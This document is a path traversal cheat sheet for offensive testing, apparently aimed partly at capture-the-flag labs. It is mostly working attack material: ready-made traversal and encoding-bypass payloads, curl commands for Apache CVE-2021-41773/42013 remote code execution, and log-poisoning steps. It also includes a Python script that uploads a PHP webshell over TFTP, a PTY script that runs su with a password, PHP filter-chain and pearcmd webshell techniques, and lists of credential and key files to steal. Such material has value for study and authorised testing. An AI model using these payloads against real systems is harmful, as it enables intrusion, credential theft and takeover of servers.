# Path Traversal - Quick Start Guide

Core payloads, detection techniques, and exploitation templates for path traversal testing.


---

## Quick Reference

| Technique | Payload | Use When |
|-----------|---------|----------|
| Simple | `../../../etc/passwd` | No filtering |
| Absolute Path | `/etc/passwd` | `../` blocked |
| Non-Recursive Strip | `....//....//....//etc/passwd` | Single-pass `../` strip |
| Sequential str_replace | `....%5C/....%5C/....%5C/....%5C/etc/passwd` | PHP `str_replace` with array of patterns |
| Double URL-Encode | `..%252f..%252f..%252fetc/passwd` | URL-decode filter |
| Prefix Validation | `/var/www/images/../../../etc/passwd` | Path prefix required |
| Null Byte | `../../../../etc/passwd%00.png` | Extension validation (PHP < 5.3.4) |
| Log Poisoning (LFI→RCE) | Inject PHP in User-Agent → include access log | `include()`/`require()` used |

---

## Server Version Fingerprinting — Check FIRST

Before fuzzing parameters, fingerprint the web server. Known CVEs often provide instant RCE:

```bash
curl -sI http://target/ | grep -i '^server:'
```

| Server Version | CVE | Impact | Exploit |
|---------------|-----|--------|---------|
| Apache/2.4.49 | CVE-2021-41773 | File read → RCE (if CGI enabled) | `curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;id"` |
| Apache/2.4.50 | CVE-2021-42013 | File read → RCE (bypass of 41773 fix) | `curl --path-as-is -X POST "http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo; cat /flag* /FLAG*"` |
| Nginx (with alias) | Off-by-slash | File read | `curl --path-as-is "http://target/prefix../etc/passwd"` |

**Key:** Use `--path-as-is` with curl to prevent client-side URL normalization. Try alternate CGI-enabled prefixes: `/cgi-bin/`, `/icons/`, `/cgi/`.

### CMS Admin Media/File Download Endpoints

Many CMS platforms have authenticated file download endpoints that are vulnerable to path traversal because they pass user input directly to file read functions without `..` validation:

```bash
# Common vulnerable CMS download endpoints (test with any authenticated session, even lowest privilege)
GET /admin/media/download_private_file?file=../../../../../../etc/passwd
GET /admin/media/download?path=../../../../../../etc/passwd
GET /admin/assets/download?filename=../../../../../../etc/passwd
GET /admin/files/get?file=../../../../../../etc/passwd

# S3/cloud storage uploaders often lack ../ validation (local uploaders may validate but cloud storage path doesn't)
# The key: the "private file download" feature trusts the filename parameter
```

**Why these work:** CMS file managers often have two code paths — one for local uploads (validates `..`) and one for cloud/S3 uploads (passes path directly to `file_get_contents` or similar). The download endpoint may use the cloud code path even for local files.

**Discovery:** Browse the CMS admin panel source, look for download links in media managers, file browsers, and asset management pages. Check JavaScript for AJAX download endpoints.

---

## Common Payloads Cheat Sheet

### Basic Traversal (Depth Testing)

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Linux Target Files

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/version
/proc/self/environ
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/.git/config
/var/www/html/.htpasswd
/var/www/html/.htaccess
```

### Windows Target Files

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\windows\repair\sam
```

### Encoding Variations

```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
```

### Bypass Techniques

```
....//....//....//etc/passwd          # Non-recursive strip (forward slash)
..././..././..././etc/passwd          # Alternative nesting
....\/....\/....\/etc/passwd          # Non-recursive strip (backslash) — see Sequential str_replace below
/etc/passwd                           # Absolute path
/var/www/images/../../../etc/passwd   # Prefix validation
../../../../etc/passwd%00.png         # Null byte (PHP < 5.3.4)
..;/..;/..;/etc/passwd               # Nginx/Tomcat
/prefix../etc/passwd                 # Nginx alias off-by-slash (use --path-as-is)
```

### Nginx Alias Traversal (Off-by-Slash)

If nginx config has `location /prefix` (no trailing slash) + `alias /path/;` (trailing slash), request `/prefix../file` escapes the alias root. Use `curl --path-as-is` to prevent client normalization. Read nginx config to find alias directives.

### PHP file_get_contents() Bypasses .htaccess

Apache `.htaccess` `<Files>` blocks only HTTP access. PHP `file_get_contents($input)` reads directly from disk — request the protected filename via PHP parameter (e.g., `?file=secret.txt`).

### Sequential `str_replace` Bypass (PHP)

When PHP uses `str_replace()` with an **array** of search patterns, each pattern is applied **sequentially** to the result of the previous replacement — NOT simultaneously. This creates bypass opportunities:

```php
// Vulnerable pattern — sequential array replacement
$path = str_replace(['../', './', '..\\', '.\\'], '', $input);
```

**Bypass with `....\/`** (URL-encoded: `....%5C/`):
```
Input:   ....\/
Step 1:  str_replace('../', '') → no match, unchanged: ....\/
Step 2:  str_replace('./', '')  → no match, unchanged: ....\/
Step 3:  str_replace('..\\', '') → MATCH at pos 2 → removes '..\' → result: ../
Step 4:  str_replace('.\\', '') → no match, '../' survives!
```

**Full payload**: `....%5C/....%5C/....%5C/....%5C/etc/passwd`

**Key insight**: The order matters. Craft payloads where an early step's removal creates a traversal sequence that later steps don't catch because they already ran.

Other sequential bypass variants:
```
....\/     → ../ (when ..\ is in the search array after ../)
..../      → ../ (when ./ is removed but ../ already processed)
....//     → ../ (standard — works against single-pass ../ removal)
```

### Traversal Depth Calculation

Count directory levels from the **base path** used in the code to filesystem root:
```
Code: include("uploads/" . $input)
Working dir: /var/www/html/
Full base: /var/www/html/uploads/

Depth: uploads/ → html/ → www/ → var/ → /  = 4 levels
Payload: ../../../../etc/passwd (or ....%5C/ × 4 for str_replace bypass)
```

**Always test depths 3-8** — the exact depth depends on the application's working directory.

---

## LFI to RCE via Log Poisoning

When path traversal uses `include()` / `require()` (PHP), it becomes **Local File Inclusion (LFI)**. Escalate to RCE via log poisoning:

### Technique: Apache Access Log Poisoning

**Step 1 — Inject PHP into User-Agent header:**
```bash
curl -s "http://target/index.php" \
  -H "User-Agent: <?php echo file_get_contents('/etc/passwd'); ?>"
```

**Step 2 — Include the poisoned log via LFI:**
```bash
curl -s "http://target/page.php?file=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log"
```

### Critical Rules for Log Poisoning

1. **Use `file_get_contents()` to read target files** — if the target file contains invalid PHP syntax (e.g., `<?php SOME_TOKEN_VALUE ?>`), `include()` will cause a parse error. Your injected code must read it as text:
   ```php
   <?php echo file_get_contents('/path/to/flag'); ?>
   ```

2. **Clean log is essential** — failed injection attempts permanently corrupt the log with broken PHP tags. If the log has ANY malformed `<?php` or `<?` sequences, every subsequent `include()` of that log will produce a fatal parse error (0-byte response). **Restart the service to get a clean log before retrying.**

3. **One-shot approach** — inject the payload, then include the log in the NEXT request. Do not pollute the log with test requests between injection and inclusion.

4. **Avoid quote conflicts** — the Apache Combined Log Format wraps User-Agent in double quotes. Use single quotes in PHP payloads, or use functions that don't need string arguments:
   ```php
   <?php system($_GET['c']); ?>           # Uses single quotes — safe
   <?php echo file_get_contents('/flag'); ?> # Single quotes — safe
   ```

5. **`short_open_tag` hazard** — if the app uses `<?` short tags, PHP will try to parse ANY `<?` in the included log as PHP code. Even URL query strings containing `<?` sequences can cause parse errors.

### Common Log File Paths

```
/var/log/apache2/access.log       # Debian/Ubuntu Apache
/var/log/apache2/error.log        # Apache error log
/var/log/httpd/access_log         # CentOS/RHEL Apache
/var/log/nginx/access.log         # Nginx
/var/log/nginx/error.log          # Nginx error log
/proc/self/fd/1                   # stdout (Docker containers)
/proc/self/environ                # Process environment variables
/var/log/mail.log                 # Mail log (SMTP injection)
/var/log/vsftpd.log               # FTP log
/var/log/sshd.log                 # SSH log
```

### LFI + TFTP = RCE (No Log Poisoning Needed)

When TFTP (UDP 69) allows anonymous uploads, upload a PHP webshell to `/var/lib/tftpboot/` and include it via LFI:

```bash
# Upload webshell via TFTP (Python — works cross-platform)
python3 -c "
import socket, struct
data = b'<?php echo shell_exec(\$_GET[\"cmd\"]); ?>'
pkt = struct.pack('!H', 2) + b'shell.php\x00' + b'octet\x00'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
s.sendto(pkt, ('TARGET', 69)); resp, addr = s.recvfrom(516)
s.sendto(struct.pack('!HH', 3, 1) + data, ('TARGET', addr[1]))
s.recvfrom(516); print('Done')
"
# Include via LFI
curl "http://TARGET/?file=../../../var/lib/tftpboot/shell.php&cmd=id"
```

**PTY for `su` via webshell:** `su` requires a terminal. Use PHP `proc_open()` with PTY descriptors:
```php
<?php
$proc = proc_open('su - USER -c "CMD"', [['pty'],['pty'],['pty']], $pipes);
usleep(500000); fwrite($pipes[0], "PASSWORD\n"); fflush($pipes[0]);
usleep(1000000); echo stream_get_contents($pipes[1]);
fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
?>
```

### Alternative LFI Techniques (when log poisoning fails)

| Technique | Payload | Requires |
|-----------|---------|----------|
| PHP filter (base64) | `php://filter/convert.base64-encode/resource=/etc/passwd` | No `file_exists()` check before `include()` |
| Data wrapper | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==` | `allow_url_include=On` |
| Input wrapper | `php://input` + POST body with PHP code | `allow_url_include=On` |
| Expect wrapper | `expect://whoami` | `expect` extension loaded |
| /proc/self/environ | Include after setting PHP code in HTTP headers | Readable /proc |
| Session file | Inject PHP into session → include `/tmp/sess_SESSIONID` | Known session path |
| Mail log | Send email with PHP in body → include mail log | `mail()` or SMTP access |
| **PHP filter chain RCE** | `php://filter/convert.iconv.UTF8.CSISO2022KR|...` (generated chain) | Full control of `include()` path, no `file_exists()` |

### PHP Filter Chain RCE (Controlled Include Path)

When you **fully control** the `include()`/`require()` path (e.g., via an HTTP header or parameter that directly sets the include target), use **PHP filter chain generation** to synthesize arbitrary PHP code:

```bash
# Download and generate chain with Synacktiv's tool:
curl -sL https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py -o /tmp/php_filter_chain_generator.py
python3 /tmp/php_filter_chain_generator.py --chain '<?=`cat /opt/flag.txt`;die;?>'
```

This produces a `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...` chain — when `include()` evaluates it, the chained iconv conversions generate the PHP code byte-by-byte. Works even with `allow_url_include = Off` (unlike `php://input` or `data://`).

**Key constraints:**
- **Header size limit**: Apache default ~8190 chars. Use short-tag backtick `<?=`cmd`?>` (shorter chain) instead of `<?php system('cmd'); ?>`
- **No `file_exists()` check**: `file_exists('php://filter/...')` returns false
- **Suffix handling**: If code appends a suffix (`include($path . '/file.php')`), it's absorbed harmlessly by `php://temp`

**IMPORTANT**: PHP wrappers (`php://filter`, `data://`, etc.) are blocked by `file_exists()` checks — `file_exists('php://filter/...')` returns `false`. If the code checks `file_exists()` before `include()`, you must use log poisoning or session injection instead.

### PEAR Command Injection (pearcmd.php) via LFI

When `register_argc_argv = On` (check phpinfo) and PHP-PEAR is installed, including `pearcmd.php` via LFI allows writing arbitrary PHP files to disk.

**Prerequisites check (from phpinfo):**
- `register_argc_argv` = On
- `include_path` contains PEAR (e.g., `/usr/share/php/PEAR`, `/usr/share/php8`)
- `disable_functions` = empty or doesn't block `system`/`exec`

**Common pearcmd.php paths by distro:**

| Distribution | Path |
|---|---|
| Debian/Ubuntu | `/usr/share/php/pearcmd.php` |
| RHEL/CentOS | `/usr/share/pear/pearcmd.php` |
| openSUSE/SLES | `/usr/share/php/PEAR/pearcmd.php` or `/usr/share/php8/pearcmd.php` |
| Alpine | `/usr/share/php84/pearcmd.php` (varies by PHP version) |

**Two-stage exploit:**
```bash
# Stage 1: Write webshell via config-create (hex-encode command to avoid URL issues)
HEXCMD=$(echo -n "id" | xxd -p | tr -d '\n')
curl -s -g "http://target/vuln.php?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system(hex2bin('${HEXCMD}'))?>+/tmp/shell.php"

# Stage 2: Include the written file
curl -s "http://target/vuln.php?locale=../../../../../../tmp&namespace=shell"
```

**Output extraction:** Command output appears in PEAR config serialized data between `namespace=pearcmd&/` and `/pear/php`. Output is doubled (system() echo + return).

**Key notes:**
- Must use `curl -g` (globoff) to prevent interpretation of PHP tags `<>`
- The written file is a PEAR config with PHP code embedded — server returns 500 but code executes
- Works even with `allow_url_include = Off` (file is local)

---

## Encoding Quick Reference

| Character | Single | Double |
|-----------|--------|--------|
| `/` | `%2f` | `%252f` |
| `\` | `%5c` | `%255c` |
| `.` | `%2e` | `%252e` |

**Full double-encoded payload:**
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

### Null Byte Encoding

```
%00        # Standard URL encoding
%2500      # Double encoding
\x00       # Hex notation
\0         # Escape sequence
```

### Alternative Null Byte Payloads

```
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.gif
../../../../etc/passwd%2500.png (double-encoded)
```

---

## Common Prefixes for Prefix Bypass

```
/var/www/images/
/opt/app/static/
/home/user/uploads/
C:\inetpub\wwwroot\images\
```

### Path Resolution Example

```
/var/www/images/../../../etc/passwd
  /var/www/../../../etc/passwd
  /var/../../../etc/passwd
  /../../../etc/passwd
  /etc/passwd
```

---

## Common Vulnerable Parameters

```
?file=
?filename=
?path=
?document=
?page=
?template=
?include=
?dir=
?folder=
?load=
```

---

## Automated Testing

**dotdotpwn:**
```bash
perl dotdotpwn.pl -m http -h target.com -x 80 -f /etc/passwd -k "root:" -d 8
```

**ffuf:**
```bash
ffuf -u https://target.com/image?filename=FUZZ -w path-traversal.txt -mr "root:x"
```

**Custom script:**
```python
import requests

payloads = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "....%5C/....%5C/....%5C/....%5C/etc/passwd",   # Sequential str_replace bypass
    "..%252f..%252f..%252f..%252fetc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
]

for payload in payloads:
    r = requests.get(f"https://target.com/image?filename={payload}")
    if "root:x" in r.text:
        print(f"[+] Vulnerable: {payload}")
```

---

## Quick Command Reference

### Test with cURL

```bash
# Basic test
curl "https://target.com/image?filename=../../../etc/passwd"

# Encoded test
curl "https://target.com/image?filename=..%252f..%252f..%252fetc/passwd"

# With authentication
curl -H "Authorization: Bearer TOKEN" \
     "https://target.com/image?filename=/etc/passwd"

# Save response
curl "https://target.com/image?filename=../../../etc/passwd" -o passwd.txt
```

### Test with Python

```python
import requests

url = "https://target.com/image"
params = {"filename": "../../../etc/passwd"}

response = requests.get(url, params=params)

if "root:x" in response.text:
    print("[+] Vulnerable to path traversal!")
    print(response.text)
else:
    print("[-] Not vulnerable or blocked")
```

### Test with PowerShell

```powershell
# Basic test
Invoke-WebRequest -Uri "https://target.com/image?filename=../../../etc/passwd"

# Check for vulnerability
$response = Invoke-WebRequest -Uri "https://target.com/image?filename=../../../etc/passwd"
if ($response.Content -match "root:x") {
    Write-Host "[+] Vulnerable!" -ForegroundColor Green
}
```

---

## Intruder Payload List (All Techniques)

```http
GET /image?filename=PAYLOAD HTTP/2
```

```
../../../etc/passwd
../../../../etc/passwd
/etc/passwd
....//....//....//....//etc/passwd
....%5C/....%5C/....%5C/....%5C/etc/passwd
..%252f..%252f..%252f..%252fetc/passwd
/var/www/images/../../../etc/passwd
../../../../etc/passwd%00.png
```

**Grep - Match**: `root:x:0:0`

---

---

## Framework-Specific CVEs

### Next.js / React

| CVE | Version | Vulnerability |
|-----|---------|---------------|
| CVE-2025-29927 | < 15.2.3 | Middleware bypass via `x-middleware-subrequest` header |
| CVE-2025-55182 | Next.js 16.x | React2Shell — unauthenticated RCE via server components |
| CVE-2024-34351 | < 14.1.1 | SSRF via Host header in Server Actions |

**Detection:** Check `package.json` for Next.js version. Look for `"next": "16.x"` or similar.

**Reference:** [Path Traversal Web Security Academy](https://portswigger.net/web-security/file-path-traversal) for additional techniques and explanations.
